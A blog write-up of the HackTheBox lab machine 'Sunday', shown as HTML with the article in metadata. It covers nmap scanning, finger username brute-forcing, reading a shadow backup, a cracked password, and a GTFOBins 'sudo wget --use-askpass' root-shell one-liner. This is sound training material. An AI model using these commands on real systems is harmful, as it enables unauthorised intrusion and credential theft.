<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Sunday | PwndSide</title><meta name=keywords content="privesc,web,linux,ssh"><meta name=description content="Linux machine which has a finger port which helps us to list users by bruteforcing. We privEsc to summy thanks to a password leak on a backup file. With a sudoers command we privEsc to root."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Sunday"><meta property="og:description" content="Linux machine which has a finger port which helps us to list users by bruteforcing. We privEsc to summy thanks to a password leak on a backup file. With a sudoers command we privEsc to root."><meta property="og:type" content="article"><meta property="og:url" content="https://pwndside.github.io/posts/sunday-htb/"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-01T16:42:25+02:00"><meta property="article:modified_time" content="2023-09-01T16:42:25+02:00"><meta property="og:site_name" content="PwndSide"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Sunday"><meta name=twitter:description content="Linux machine which has a finger port which helps us to list users by bruteforcing. We privEsc to summy thanks to a password leak on a backup file. With a sudoers command we privEsc to root."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Sunday","item":"https://pwndside.github.io/posts/sunday-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Sunday","name":"Sunday","description":"Linux machine which has a finger port which helps us to list users by bruteforcing. We privEsc to summy thanks to a password leak on a backup file. With a sudoers command we privEsc to root.","keywords":["privesc","web","linux","ssh"],"articleBody":"Room Information Room name: Sunday Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Sunday Tools Used nmap finger-user-enum.pl Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 PORT STATE SERVICE REASON VERSION 79/tcp open finger? syn-ack ttl 59 |_finger: No one logged on\\x0D | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where 111/tcp open rpcbind syn-ack ttl 63 2-4 (RPC #100000) 515/tcp open printer syn-ack ttl 59 6787/tcp open ssl/http syn-ack ttl 59 Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Issuer: commonName=sunday/organizationName=Host Root CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-12-08T19:40:00 | Not valid after: 2031-12-06T19:40:00 | MD5: 6bd3:4b32:c05a:e5fe:a8c8:61f0:4361:414a | SHA-1: a5eb:c880:968c:84aa:10b2:a944:bad2:56ca:aed5:b66a | -----BEGIN CERTIFICATE----- | MIIC4DCCAcqgAwIBAgIHAIqqcz45jjALBgkqhkiG9w0BAQswKDEVMBMGA1UEChMM | SG9zdCBSb290IENBMQ8wDQYDVQQDEwZzdW5kYXkwHhcNMjExMjA4MTk0MDAwWhcN | MzExMjA2MTk0MDAwWjARMQ8wDQYDVQQDEwZzdW5kYXkwggEiMA0GCSqGSIb3DQEB | AQUAA4IBDwAwggEKAoIBAQC67wVPVDRPU/Sahp2QnHx2NlMUQrkyBJrr4TSjS9v6 | /DFKqf3m2XnYuKyFl9BAO8Mi+Hz3ON4nZWmigZGX6LnJpci6whB89pLZdcogruB8 | YMyGuP8y2v3orEBLQ5NrcP6fcKLMp+6PXurvuZDgPH+oXHJyp/w//pkBROQRC0oN | 8dx7Zq2t4ZfDiqhgw1j79V7kZNOjKp8gU1HmQ/BjYEaOfVZNwuTVyqUtfcjuxIio | JEHaVmhNV9Xp9DAOLBFuTXpsJe3anSjGGP0DWMyNOps2VrZUyJwC22U5jlcp7Rj/ | WWE5gnm6ClH44DXlKMIt8O2vq0MfqvvGeSIFbSOPb6Q3AgMBAAGjKjAoMBEGA1Ud | EQQKMAiCBnN1bmRheTATBgNVHSUEDDAKBggrBgEFBQcDATALBgkqhkiG9w0BAQsD | ggEBAC/f3nN6ur2oSSedYNIkf6/+MV3qu8xE+Cqt/SbSk0uSmQ7hYpMhc8Ele/gr | Od0cweaClKXEhugRwfVW5jmjJXrnSZtOpyz09dMhZMA9RJ9efVfnrn5Qw5gUriMx | dFMrAnOIXsFu0vnRZLJP7E95NHpZVECnRXCSPjp4iPe/vyl1OuoVLBhoOwZ8O7zw | WlP/51SiII8LPNyeq+01mCY0mv3RJD9uAeNJawnFwsCo/Tg9/mjk0zxUMaXm80Bb | qsSmST23vYwuPw3c/91fJI4dWb7uEZJa55hRIU0uMPOLOUpN1kKkGPO+7QCzfedc | WPptRhU+2UMGhFXHyGV5EJp2zvc= |_-----END CERTIFICATE----- |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ | tls-alpn: |_ http/1.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_ssl-date: TLS randomness does not represent time 22022/tcp open ssh syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0) | ssh-hostkey: | 2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ | 256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.94%I=7%D=8/31%Time=64F0B5E8%P=arm-apple-darwin22.4.0%r(G SF:enericLines,12,\"No\\x20one\\x20logged\\x20on\\r\\n\")%r(GetRequest,93,\"Login\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20 SF:\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\? SF:\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\?\\?\\?\\r\\n\")%r(Help,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHE SF:LP\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\?\\?\\?\\r\\n\")%r(HTTPOptions,93,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Whe SF:re\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\")%r(RTSPRequest,93,\"Login\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20 SF:\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\. SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\")%r SF:(SSLSessionReq,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\?\\?\\?\\r\\n\")%r(TerminalServerCookie,5D,\"Login\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\ SF:x20\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\"); As we can see, there are 5 open ports. Port 79 is for finger?, port 111 is a rpc, port 515 is running printer, 6787 is a ssl port and finally 22022 is a ssh port.\nEnumeration Navigating the website we can see a Oracle Solaris Dashboard asking for credentials.\nAs we don’t have any credentials, I tried to fuzz the page without succeed.\nSo I decide to enumerate other interesting ports.\nFirst I start with finger? which is a user information lookup command which gives details of all the users logged in**.**\nnc 10.10.10.76 79 Once connected to the port via nc I attempted to list the users with the following command:\n@10.10.10.76 But the program answers with the next error Finger forwarding service denied.\nWhen we try, instead of listing users, to put a valid username like root the program gives us info about it so I decided to try to brute force usernames.\nExploiting Googling for a finger enumerator exploit I found a HackTricks write up which talks about the finger command where we can find a link to a github project called finger-user-enum which is an alternative for listing users.\nI have executed it with the following command with a username wordlist located at SecLists.\n./finger-user-enum.pl -U ~/Documents/wordlists/SecLists/Usernames/Names/names.txt -t 10.10.10.76 access@10.10.10.76: access No Access User \u003c . . . . \u003e..nobody4 SunOS 4.x NFS Anonym \u003c . . . . \u003e.. admin@10.10.10.76: Login Name TTY Idle When Where..adm Admin \u003c . . . . \u003e..dladm Datalink Admin \u003c . . . . \u003e..netadm Network Admin \u003c . . . . \u003e..netcfg Network Configuratio \u003c . . . . \u003e..dhcpserv DHCP Configuration A \u003c . . . . \u003e..ikeuser IKE Admin \u003c . . . . \u003e..lp Line Printer Admin \u003c . . . . \u003e.. anne marie@10.10.10.76: Login Name TTY Idle When Where..anne ???..marie ???.. bin@10.10.10.76: bin ??? \u003c . . . . \u003e.. dee dee@10.10.10.76: Login Name TTY Idle When Where..dee ???..dee ???.. ike@10.10.10.76: ikeuser IKE Admin \u003c . . . . \u003e.. jo ann@10.10.10.76: Login Name TTY Idle When Where..ann ???..jo ???.. la verne@10.10.10.76: Login Name TTY Idle When Where..la ???..verne ???.. line@10.10.10.76: Login Name TTY Idle When Where..lp Line Printer Admin \u003c . . . . \u003e.. message@10.10.10.76: Login Name TTY Idle When Where..smmsp SendMail Message Sub \u003c . . . . \u003e.. miof mela@10.10.10.76: Login Name TTY Idle When Where..mela ???..miof ???.. root@10.10.10.76: root Super-User console .. sammy@10.10.10.76: sammy ??? ssh 10.10.14.13 .. sunny@10.10.10.76: sunny ??? ssh 10.10.14.13 .. sys@10.10.10.76: sys ??? \u003c . . . . \u003e.. zsa zsa@10.10.10.76: Login Name TTY Idle When Where..zsa ???..zsa ???.. Removing all the thrash we have three possible valid usernames sammy and sunny.\nGaining an Initial Foothold Before trying to bruteforce, I attempted common passwords in order to log in and I found one valid combination sunny/sunday.\nssh -p 22022 username@10.10.10.76 In our home directory there is no flag (we need to privEsc) but we can see the .bash_history which is not empty\nsu - su - cat /etc/resolv.conf su - ps auxwww|grep overwrite su - sudo -l sudo /root/troll ls /backup ls -l /backup cat /backup/shadow.backup sudo /root/troll sudo /root/troll su - sudo -l sudo /root/troll ps auxwww ps auxwww ps auxwww top top top ps auxwww|grep overwrite su - su - cat /etc/resolv.conf ps auxwww|grep over sudo -l sudo /root/troll sudo /root/troll sudo /root/troll sudo /root/troll Escalating Privilege We can see some commands which may have been executed by sunny.\nOne of them is pretty interesting sudo /root/troll if we made sudo -l we can see that is the only command we can execute as sudo without password.\nOnce executed shows a id output as root but the name makes me think that is only a script printing the root id output.\nIf we return to the .bash_history we can see other command which is consulting a backup.\ncat /backup/shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: The file is passwd backup file with two password leaked but hashed so I decided to crack summy password with john.\nOnce cracked we have the next password cooldude!\nPerfect we are logged as summy, let’s check his home directory for a flag.\nBy id we can see that summy doesn’t have root permissions, so we need to privEsc.\nChecking the sudo commands with the next command\nsudo -l User sammy may run the following commands on sunday: (ALL) ALL (root) NOPASSWD: /usr/bin/wget We can see that we are able to execute wget without password as sudo.\nIn the GTFOBins website there is one list of commands which help us to privEsc.\nTF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh\\n/bin/sh 1\u003e\u00260' \u003e$TF sudo wget --use-askpass=$TF 0 We are root 😎\nThank you for reading, and happy hacking! 😄\n","wordCount":"1138","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-09-01T16:42:25+02:00","dateModified":"2023-09-01T16:42:25+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/sunday-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class=post-title>Sunday</h1><div class=post-description>Linux machine which has a finger port which helps us to list users by bruteforcing. We privEsc to summy thanks to a password leak on a backup file. With a sudoers command we privEsc to root.</div><div class=post-meta><span title='2023-09-01 16:42:25 +0200 CEST'>September 1, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1138 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/sunday-htb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Sunday</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Sunday>https://app.hackthebox.com/machines/Sunday</a></li></ul><p><img loading=lazy src=/HTB/sunday-icon.png alt=Untitled></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li><li>finger-user-enum.pl</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT      STATE SERVICE  REASON         VERSION
</span></span><span class=line><span class=cl>79/tcp    open  finger?  syn-ack ttl <span class=m>59</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_finger: No one logged on<span class=se>\x</span>0D
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines: 
</span></span><span class=line><span class=cl><span class=p>|</span>     No one logged on
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Login Name TTY Idle When Where
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 ???
</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Login Name TTY Idle When Where
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 ???
</span></span><span class=line><span class=cl><span class=p>|</span>     OPTIONS ???
</span></span><span class=line><span class=cl><span class=p>|</span>   Help: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Login Name TTY Idle When Where
</span></span><span class=line><span class=cl><span class=p>|</span>     HELP ???
</span></span><span class=line><span class=cl><span class=p>|</span>   RTSPRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Login Name TTY Idle When Where
</span></span><span class=line><span class=cl><span class=p>|</span>     OPTIONS ???
</span></span><span class=line><span class=cl><span class=p>|</span>     RTSP/1.0 ???
</span></span><span class=line><span class=cl><span class=p>|</span>   SSLSessionReq, TerminalServerCookie: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Login Name TTY Idle When Where
</span></span><span class=line><span class=cl>111/tcp   open  rpcbind  syn-ack ttl <span class=m>63</span> 2-4 <span class=o>(</span>RPC <span class=c1>#100000)</span>
</span></span><span class=line><span class=cl>515/tcp   open  printer  syn-ack ttl <span class=m>59</span>
</span></span><span class=line><span class=cl>6787/tcp  open  ssl/http syn-ack ttl <span class=m>59</span> Apache httpd 2.4.33 <span class=o>((</span>Unix<span class=o>)</span> OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>sunday
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:sunday
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>sunday/organizationName<span class=o>=</span>Host Root CA
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>2048</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-12-08T19:40:00
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid after:  2031-12-06T19:40:00
</span></span><span class=line><span class=cl><span class=p>|</span> MD5:   6bd3:4b32:c05a:e5fe:a8c8:61f0:4361:414a
</span></span><span class=line><span class=cl><span class=p>|</span> SHA-1: a5eb:c880:968c:84aa:10b2:a944:bad2:56ca:aed5:b66a
</span></span><span class=line><span class=cl><span class=p>|</span> -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl><span class=p>|</span> MIIC4DCCAcqgAwIBAgIHAIqqcz45jjALBgkqhkiG9w0BAQswKDEVMBMGA1UEChMM
</span></span><span class=line><span class=cl><span class=p>|</span> SG9zdCBSb290IENBMQ8wDQYDVQQDEwZzdW5kYXkwHhcNMjExMjA4MTk0MDAwWhcN
</span></span><span class=line><span class=cl><span class=p>|</span> MzExMjA2MTk0MDAwWjARMQ8wDQYDVQQDEwZzdW5kYXkwggEiMA0GCSqGSIb3DQEB
</span></span><span class=line><span class=cl><span class=p>|</span> AQUAA4IBDwAwggEKAoIBAQC67wVPVDRPU/Sahp2QnHx2NlMUQrkyBJrr4TSjS9v6
</span></span><span class=line><span class=cl><span class=p>|</span> /DFKqf3m2XnYuKyFl9BAO8Mi+Hz3ON4nZWmigZGX6LnJpci6whB89pLZdcogruB8
</span></span><span class=line><span class=cl><span class=p>|</span> YMyGuP8y2v3orEBLQ5NrcP6fcKLMp+6PXurvuZDgPH+oXHJyp/w//pkBROQRC0oN
</span></span><span class=line><span class=cl><span class=p>|</span> 8dx7Zq2t4ZfDiqhgw1j79V7kZNOjKp8gU1HmQ/BjYEaOfVZNwuTVyqUtfcjuxIio
</span></span><span class=line><span class=cl><span class=p>|</span> JEHaVmhNV9Xp9DAOLBFuTXpsJe3anSjGGP0DWMyNOps2VrZUyJwC22U5jlcp7Rj/
</span></span><span class=line><span class=cl><span class=p>|</span> WWE5gnm6ClH44DXlKMIt8O2vq0MfqvvGeSIFbSOPb6Q3AgMBAAGjKjAoMBEGA1Ud
</span></span><span class=line><span class=cl><span class=p>|</span> EQQKMAiCBnN1bmRheTATBgNVHSUEDDAKBggrBgEFBQcDATALBgkqhkiG9w0BAQsD
</span></span><span class=line><span class=cl><span class=p>|</span> ggEBAC/f3nN6ur2oSSedYNIkf6/+MV3qu8xE+Cqt/SbSk0uSmQ7hYpMhc8Ele/gr
</span></span><span class=line><span class=cl><span class=p>|</span> Od0cweaClKXEhugRwfVW5jmjJXrnSZtOpyz09dMhZMA9RJ9efVfnrn5Qw5gUriMx
</span></span><span class=line><span class=cl><span class=p>|</span> dFMrAnOIXsFu0vnRZLJP7E95NHpZVECnRXCSPjp4iPe/vyl1OuoVLBhoOwZ8O7zw
</span></span><span class=line><span class=cl><span class=p>|</span> WlP/51SiII8LPNyeq+01mCY0mv3RJD9uAeNJawnFwsCo/Tg9/mjk0zxUMaXm80Bb
</span></span><span class=line><span class=cl><span class=p>|</span> qsSmST23vYwuPw3c/91fJI4dWb7uEZJa55hRIU0uMPOLOUpN1kKkGPO+7QCzfedc
</span></span><span class=line><span class=cl><span class=p>|</span> WPptRhU+2UMGhFXHyGV5EJp2zvc<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.33 <span class=o>(</span>Unix<span class=o>)</span> OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
</span></span><span class=line><span class=cl><span class=p>|</span> http-title: Solaris Dashboard
</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was https://10.10.10.76:6787/solaris/
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
